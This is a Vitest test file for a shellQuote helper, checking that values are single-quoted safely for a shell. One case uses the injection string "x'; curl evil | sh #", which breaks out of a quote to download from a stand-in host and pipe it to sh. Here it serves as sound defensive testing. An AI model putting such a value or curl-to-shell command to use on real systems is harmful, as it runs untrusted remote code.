import { describe, expect, it } from "vitest";
import { shellQuote } from "./shellQuote";

describe("shellQuote", () => {
  it("wraps a plain value in single quotes", () => {
    expect(shellQuote("train")).toBe("'train'");
  });

  it("keeps spaces inside one argument", () => {
    expect(shellQuote("train run")).toBe("'train run'");
  });

  it("escapes embedded single quotes", () => {
    expect(shellQuote("it's")).toBe("'it'\\''s'");
  });

  it("neutralises command separators", () => {
    expect(shellQuote("x'; curl evil | sh #")).toBe(
      "'x'\\''; curl evil | sh #'",
    );
  });

  it("leaves a tmux session id literal", () => {
    // `$0` must not expand, which single quotes guarantee in every shell.
    expect(shellQuote("$0")).toBe("'$0'");
  });

  it("handles an empty value", () => {
    expect(shellQuote("")).toBe("''");
  });
});
